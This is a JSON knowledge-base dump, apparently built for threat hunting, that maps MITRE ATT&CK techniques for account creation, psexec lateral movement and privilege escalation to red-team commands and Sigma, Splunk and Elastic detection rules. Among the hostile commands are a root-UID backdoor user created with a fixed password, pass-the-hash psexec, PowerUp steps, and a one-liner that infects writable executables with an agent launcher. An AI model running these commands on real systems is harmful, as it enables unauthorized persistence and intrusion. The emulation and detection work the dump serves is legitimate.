"Username of the user to create"}}, "executor": {"elevation_required": true, "command": "New-LocalUser -Name \"#{username}\" -NoPassword\n", "name": "powershell", "cleanup_command": "Remove-LocalUser -Name \"#{username}\" -ErrorAction Ignore\n"}}, {"description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n", "supported_platforms": ["linux"], "name": "Create a new user in Linux with `root` UID and GID.", "input_arguments": {"username": {"default": "butter", "type": "String", "description": "Username of the user to create"}, "password": {"default": "BetterWithButter", "type": "String", "description": "Password of the user to create"}}, "executor": {"elevation_required": true, "command": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}\necho \"#{password}\" | passwd --stdin #{username}\n", "name": "bash", "cleanup_command": "userdel #{username}"}}], "attack_technique": "T1136"}}, {"Threat Hunting Tables": {"mitre_attack": "T1136", "file_value": "", "file_path": "", "parent_process": "Net.exe", "itw_sample": "", "chain_id": "100133", "registry_value": "", "mitre_caption": "create_account", "registry_path": "", "frequency": "low", "commandline_string": "user /add", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1136", "file_value": "", "file_path": "", "parent_process": "Net.exe", "itw_sample": "", "chain_id": "100134", "registry_value": "", "mitre_caption": "create_account", "registry_path": "", "frequency": "low", "commandline_string": "localgroup administrators * /add", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1136", "file_value": "", "file_path": "", "parent_process": "Net.exe", "itw_sample": "", "chain_id": "100135", "registry_value": "", "mitre_caption": "create_account", "registry_path": "", "frequency": "low", "commandline_string": "user * \\password \\domain", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1136", "file_value": "", "file_path": "", "parent_process": "Net.exe", "itw_sample": "", "chain_id": "100136", "registry_value": "", "mitre_caption": "create_account", "registry_path": "", "frequency": "low", "commandline_string": "dsadd user", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1136", "Empire Module": "powershell/persistence/misc/add_netuser", "Technique": "Create Account", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/add_netuser\":  [\"T1136\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1136", "Empire Module": "powershell/privesc/powerup/service_useradd", "Technique": "Create Account", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/service_useradd\":  [\"T1136\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_command_line contains \"New-LocalUser\"or process_command_line contains \"net user add\")", "product": "Azure Sentinel", "name": "Create Account"}, {"query": "title: Net.exe User Account Creation\nid: cd219ff3-fa99-45d4-8380-a7d15116c6dc\nstatus: experimental\ndescription: Identifies creation of local users via the net.exe command\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/014c3f51-89c6-40f1-ac9c-5688f26090ab.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136/T1136.yaml\nauthor: Endgame, JHasenbusch (adapted to sigma for oscd.community)\ndate: 2018/10/30\nmodified: 2019/11/11\ntags:\n    - attack.persistence\n    - attack.credential_access\n    - attack.t1136\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: \n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains|all: \n            - 'user'\n            - 'add'\n    condition: selection\nfalsepositives:\n    - Legit user creation\n    - Better use event ids for user creation rather than command line rules\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Net.exe User Account Creation\nid: cd219ff3-fa99-45d4-8380-a7d15116c6dc\nstatus: experimental\ndescription: Identifies creation of local users via the net.exe command\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/014c3f51-89c6-40f1-ac9c-5688f26090ab.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136/T1136.yaml\nauthor: Endgame, JHasenbusch (adapted to sigma for oscd.community)\ndate: 2018/10/30\nmodified: 2019/11/11\ntags:\n    - attack.persistence\n    - attack.credential_access\n    - attack.t1136\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: \n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains|all: \n            - 'user'\n            - 'add'\n    condition: selection\nfalsepositives:\n    - Legit user creation\n    - Better use event ids for user creation rather than command line rules\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:(*\\\\\\\\net.exe OR *\\\\\\\\net1.exe) AND CommandLine.keyword:*user* AND CommandLine.keyword:*add*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Net.exe-User-Account-Creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Net.exe User Account Creation\",\\n    \"description\": \"Identifies creation of local users via the net.exe command\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.credential_access\",\\n      \"attack.t1136\"\\n    ],\\n    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe) AND CommandLine.keyword:*user* AND CommandLine.keyword:*add*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe) AND CommandLine.keyword:*user* AND CommandLine.keyword:*add*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Net.exe User Account Creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:(*\\\\\\\\net.exe *\\\\\\\\net1.exe) AND CommandLine.keyword:*user* AND CommandLine.keyword:*add*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\net.exe\" OR Image=\"*\\\\\\\\net1.exe\") CommandLine=\"*user*\" CommandLine=\"*add*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*\\\\\\\\net.exe\", \"*\\\\\\\\net1.exe\"] CommandLine=\"*user*\" CommandLine=\"*add*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\net\\\\.exe|.*.*\\\\net1\\\\.exe))(?=.*.*user.*)(?=.*.*add.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Detects local user creation\nid: 66b6be3d-55d0-4f47-9855-d69df21740ea\ndescription: Detects local user creation on windows servers, which shouldn't happen in an Active Directory environment. Apply this Sigma Use Case on your windows\n    server logs and not on your DC logs.\nstatus: experimental\ntags:\n    - attack.persistence\n    - attack.t1136\nreferences:\n    - https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/\nauthor: Patrick Bareiss\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4720\n    condition: selection\nfields:\n    - EventCode\n    - AccountName\n    - AccountDomain\nfalsepositives: \n    - Domain Controller Logs\n    - Local accounts managed by privileged account management tools\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Detects local user creation\nid: 66b6be3d-55d0-4f47-9855-d69df21740ea\ndescription: Detects local user creation on windows servers, which shouldn't happen in an Active Directory environment. Apply this Sigma Use Case on your windows\n    server logs and not on your DC logs.\nstatus: experimental\ntags:\n    - attack.persistence\n    - attack.t1136\nreferences:\n    - https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/\nauthor: Patrick Bareiss\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4720\n    condition: selection\nfields:\n    - EventCode\n    - AccountName\n    - AccountDomain\nfalsepositives: \n    - Domain Controller Logs\n    - Local accounts managed by privileged account management tools\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "EventID:\"4720\"", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Detects-local-user-creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Detects local user creation\",\\n    \"description\": \"Detects local user creation on windows servers, which shouldn\\'t happen in an Active Directory environment. Apply this Sigma Use Case on your windows server logs and not on your DC logs.\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1136\"\\n    ],\\n    \"query\": \"EventID:\\\\\"4720\\\\\"\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:\\\\\"4720\\\\\"\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Detects local user creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n    EventCode = {{_source.EventCode}}\\\\n  AccountName = {{_source.AccountName}}\\\\nAccountDomain = {{_source.AccountDomain}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID:\"4720\"", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "EventID=\"4720\" | table EventCode,AccountName,AccountDomain", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4720\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^4720'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "index=main  source=\"/var/log/secure\" eventtype=useradd | table user,host,src, UID, GID", "product": "Splunk", "name": null}, {"query": "index=linux source=\"/var/log/secure\" eventtype=userdel delete| table user,host", "product": "Splunk", "name": null}, {"query": "Root Account Creation: index=linux  source=\"/var/log/secure\" eventtype=useradd UID=0 OR GID=0", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "/var/log/secure with \"useradd\"  and \"userdel\""}], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "Lat. Mov. and Execution:", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "Lat. Mov. and Execution:", "Built-in Windows Command": "", "Cobalt Strike": "", "Description": "", "Metasploit": ""}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "psexec is part of the SysInternals suite. It's not on systems by default, but it is likely to be a trusted executable, especially on sysadmin boxes where other SysInternals tools already exist:\n\npsexec /accepteula \\\\ip -u domain\\user -p password -c -f \\\\smbip\\share\\file.exe (Copy and execute file.exe on the remote system)\npsexec /accepteula \\\\ip -u domain\\user -p  lm:ntlm cmd.exe /c dir c:\\Progra~1 (Run cmd.exe on the remote system using the lm:ntlm password hash - aka pass the hash)\npsexec /accepteula \\\\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "psexec COMP_NAME {listener name} (via sc)\npsexec_sh COMP_NAME {listener name} (via powershell)", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "PSEXEC Modules:\nexploit/windows/smb/psexec\nexploit/windows/local/current_user_psexec\nauxiliary/admin/smb/psexec_command\nauxiliary/scanner/smb/psexec_loggedin_users\nexploit/windows/smb/psexec_psh", "name": "Metasploit"}], "command_list": ["psexec is part of the SysInternals suite. It's not on systems by default, but it is likely to be a trusted executable, especially on sysadmin boxes where other SysInternals tools already exist:\n\npsexec /accepteula \\\\ip -u domain\\user -p password -c -f \\\\smbip\\share\\file.exe (Copy and execute file.exe on the remote system)\npsexec /accepteula \\\\ip -u domain\\user -p  lm:ntlm cmd.exe /c dir c:\\Progra~1 (Run cmd.exe on the remote system using the lm:ntlm password hash - aka pass the hash)\npsexec /accepteula \\\\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)", "psexec COMP_NAME {listener name} (via sc)\npsexec_sh COMP_NAME {listener name} (via powershell)", "PSEXEC Modules:\nexploit/windows/smb/psexec\nexploit/windows/local/current_user_psexec\nauxiliary/admin/smb/psexec_command\nauxiliary/scanner/smb/psexec_loggedin_users\nexploit/windows/smb/psexec_psh"], "technique_id": "T1077\nT1035", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1077\nT1035", "Built-in Windows Command": "psexec is part of the SysInternals suite. It's not on systems by default, but it is likely to be a trusted executable, especially on sysadmin boxes where other SysInternals tools already exist:\n\npsexec /accepteula \\\\ip -u domain\\user -p password -c -f \\\\smbip\\share\\file.exe (Copy and execute file.exe on the remote system)\npsexec /accepteula \\\\ip -u domain\\user -p  lm:ntlm cmd.exe /c dir c:\\Progra~1 (Run cmd.exe on the remote system using the lm:ntlm password hash - aka pass the hash)\npsexec /accepteula \\\\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)", "Cobalt Strike": "psexec COMP_NAME {listener name} (via sc)\npsexec_sh COMP_NAME {listener name} (via powershell)", "Description": "psexec copies over a file to the remote box via SMB, then creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, then deletes the service. Depending on the version of psexec, it might also migrate out of the initial process and delete the file that was copied over too. This is very similar to the previously mentioned technique of creating a service remotely, but the operator has much less control over the parameters", "Metasploit": "PSEXEC Modules:\nexploit/windows/smb/psexec\nexploit/windows/local/current_user_psexec\nauxiliary/admin/smb/psexec_command\nauxiliary/scanner/smb/psexec_loggedin_users\nexploit/windows/smb/psexec_psh"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "Approved for Public Release; Distribution Unlimited. Case Number 17-3569. 2018 The MITRE Corporation. All Rights Reserved\n", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "Approved for Public Release; Distribution Unlimited. Case Number 17-3569. \u00a92018 The MITRE Corporation. All Rights Reserved\n", "Built-in Windows Command": "", "Cobalt Strike": "", "Description": "", "Metasploit": ""}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "exploit/windows/local/trusted_service_path", "name": "Metasploit"}, {"source": "atomics/T1044/T1044.yaml", "command": "Get-WmiObject win32_service | select PathName\nget-acl \"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" | FL | findstr \"FullControl\"\n", "name": null}, {"source": "data/abilities/privilege-escalation/10681f2f-be03-44af-858d-f2b0812df185.yml", "command": {"darwin": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-darwin && sandcat.go-darwin\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payload": "sandcat.go"}}, "linux": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payload": "sandcat.go"}}}, "name": "Locate and infect files with weak but executable perms"}, {"source": "Threat Hunting Tables", "command": "*.exe /grant Everyone:F /T /C /Q ", "name": null}, {"source": "Threat Hunting Tables", "command": "icacls.exe", "name": "sub_process_1"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/multi/SuidGuidSearch", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/multi/SuidGuidSearch", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/multi/WorldWriteableFileSearch", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/multi/WorldWriteableFileSearch", "name": "Empire Module Command"}], "command_list": ["Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "exploit/windows/local/trusted_service_path", "Get-WmiObject win32_service | select PathName\nget-acl \"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" | FL | findstr \"FullControl\"\n", {"darwin": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-darwin && sandcat.go-darwin\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payload": "sandcat.go"}}, "linux": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payload": "sandcat.go"}}}, "*.exe /grant Everyone:F /T /C /Q ", "icacls.exe", "python/situational_awareness/host/multi/SuidGuidSearch", "python/situational_awareness/host/multi/SuidGuidSearch", "python/situational_awareness/host/multi/WorldWriteableFileSearch", "python/situational_awareness/host/multi/WorldWriteableFileSearch"], "technique_id": "T1044", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1044", "Built-in Windows Command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "Cobalt Strike": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "Description": "PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.", "Metasploit": "exploit/windows/local/trusted_service_path"}}, {"Atomic Red Team Test - File System Permissions Weakness": {"display_name": "File System Permissions Weakness", "atomic_tests": [{"description": "This test to show checking file system permissions weakness and which can lead to privilege escalation by replacing malicious file. Example; check weak file permission and then replace.\npowershell -c \"Get-WmiObject win32_service | select PathName\"   (check service file location) and \ncopy /Y C:\\temp\\payload.exe C:\\ProgramData\\folder\\Update\\weakpermissionfile.exe   ( replace weak permission file with malicious file )\n", "supported_platforms": ["windows"], "name": "File System Permissions Weakness", "input_arguments": {"weak_permission_file": {"default": "GoogleUpdate.exe", "type": "path", "description": "check weak files permission"}}, "executor": {"elevation_required": false, "command": "Get-WmiObject win32_service | select PathName\nget-acl \"C:\\Program Files (x86)\\Google\\Update\\#{weak_permission_file}\" | FL | findstr \"FullControl\"\n", "name": "powershell"}}], "attack_technique": "T1044"}}, {"Mitre Stockpile - Locate and infect files with weak but executable perms": {"platforms": {"darwin": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-darwin && sandcat.go-darwin\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payload": "sandcat.go"}}, "linux": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payload": "sandcat.go"}}}, "description": "Locate and infect files with weak but executable perms", "tactic": "privilege-escalation", "technique": {"attack_id": "T1044", "name": "File System Permissions Weakness"}, "id": "10681f2f-be03-44af-858d-f2b0812df185", "name": "Weak executable files"}}, {"Threat Hunting Tables": {"mitre_attack": "T1044", "file_value": "", "file_path": "", "parent_process": "*.exe", "itw_sample": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", "chain_id": "100125", "registry_value": "", "mitre_caption": "file_systems_permissions_weakness", "registry_path": "", "frequency": "low", "commandline_string": "/grant Everyone:F /T /C /Q ", "loaded_dll": "", "os": "windows", "sub_process_1": "icacls.exe", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1044", "Empire Module": "python/situational_awareness/host/multi/SuidGuidSearch", "Technique": "File System Permissions Weakness", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/host/multi/SuidGuidSearch\":  [\"T1044\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1044", "Empire Module": "python/situational_awareness/host/multi/WorldWriteableFileSearch", "Technique": "File System Permissions Weakness", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/host/multi/WorldWriteableFileSearch\":  [\"T1044\"],"}}], "queries": [{"query": "Sysmon| where EventID == 7 and (module_loaded contains \"\\\\Temp\\\\\"or module_loaded contains \"C:\\\\Users\\\\\"or driver_signature_status !contains \"Valid\")", "product": "Azure Sentinel", "name": "File System Permissions Weakness"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "exploit/windows/local/trusted_service_path", "name": "Metasploit"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/allchecks", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/allchecks", "name": "Empire Module Command"}], "command_list": ["Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "exploit/windows/local/trusted_service_path", "powershell/privesc/powerup/allchecks", "powershell/privesc/powerup/allchecks"], "technique_id": "T1034", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1034", "Built-in Windows Command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "Cobalt Strike": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "Description": "PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.", "Metasploit": "exploit/windows/local/trusted_service_path"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1034", "Empire Module": "powershell/privesc/powerup/allchecks", "Technique": "Path Interception", "ATT&CK Technique #2": "T1044", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/allchecks\":  [\"T1034\",\"T1044\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "exploit/windows/local/trusted_service_path", "name": "Metasploit"}, {"source": "atomics/T1058/T1058.yaml", "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename |FL\n", "name": null}], "command_list": ["Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "exploit/windows/local/trusted_service_path", "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename |FL\n"], "technique_id": "T1058", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1058", "Built-in Windows Command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "Cobalt Strike": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "Description": "PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.", "Metasploit": "exploit/windows/local/trusted_service_path"}}, {"Atomic Red Team Test - Service Registry Permissions Weakness": {"display_name": "Service Registry Permissions Weakness", "atomic_tests": [{"description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg. \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n", "supported_platforms": ["windows"], "name": "Service Registry Permissions Weakness", "input_arguments": {"weak_service_name": {"default": "weakservicename", "type": "Registry", "description": "weak service check"}}, "executor": {"elevation_required": false, "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name} |FL\n", "name": "powershell"}}], "attack_technique": "T1058"}}], "queries": [{"query": "title: Possible privilege escalation via service registry permissions weakness\nid: 0f9c21f1-6a73-4b0e-9809-cb562cb8d981\ndescription: Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level\nreferences:\n    - 